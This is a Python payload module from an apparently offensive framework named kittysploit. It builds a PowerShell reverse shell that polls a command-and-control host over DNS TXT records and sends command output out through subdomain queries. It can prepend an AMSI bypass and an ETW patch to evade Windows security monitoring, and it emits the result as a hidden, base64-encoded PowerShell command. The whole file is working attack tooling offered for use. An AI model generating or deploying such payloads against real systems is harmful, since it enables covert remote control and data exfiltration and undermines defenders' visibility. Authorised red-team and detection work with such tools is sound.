from kittysploit import *
import base64

from lib.c2.dns_reverse_agent import build_powershell_dns_agent_script


class Module(Payload):
	"""PowerShell DNS TXT polling agent — pairs with listeners/covert/dns."""

	CLIENT_LANGUAGE = "powershell"

	__info__ = {
		"name": "PowerShell DNS Reverse Shell",
		"description": (
			"Poll DNS TXT for commands and exfil output via result subdomain queries "
			"(raw UDP DNS — custom nameserver IP:port). "
			"Pairs with listeners/covert/dns."
		),
		"category": PayloadCategory.CMD,
		"arch": Arch.OTHER,
		"platform": Platform.WINDOWS,
		"listener": "listeners/covert/dns",
		"handler": Handler.REVERSE,
		"session_type": SessionType.DNS,
	}

	domain = OptString("c2.local", "C2 DNS zone (must match listener)", True)
	client_id = OptString("", "Agent client ID", False)
	lhost = OptString("127.0.0.1", "DNS server address (C2 host)", True)
	lport = OptPort(53, "DNS server port", True)
	poll_interval = OptInteger(5, "Poll interval seconds", False)
	bypass_amsi = OptBool(False, "Prepend AMSI bypass", False, True)
	patch_etw = OptBool(False, "Patch EtwEventWrite", False, True)

	def generate(self):
		identity = None
		if hasattr(self, "_apply_implant_identity_options"):
			try:
				identity = self._apply_implant_identity_options()
			except Exception:
				identity = None
		cid = str(getattr(getattr(self, "client_id", None), "value", self.client_id) or "").strip()
		if identity and getattr(identity, "implant_id", None):
			cid = identity.implant_id
		elif not cid:
			cid = "dns1"

		script = build_powershell_dns_agent_script(
			str(self.domain or "c2.local"),
			cid,
			str(self.lhost),
			int(self.lport),
			float(getattr(getattr(self, "poll_interval", None), "value", self.poll_interval) or 5),
		)

		from lib.c2.stager_evasion import powershell_prelude

		full = powershell_prelude(
			bypass_amsi=bool(self.bypass_amsi),
			patch_etw=bool(self.patch_etw),
		) + script
		encoded = base64.b64encode(full.encode("utf-16le")).decode("ascii")
		return f"powershell -nop -w hidden -EncodedCommand {encoded}"
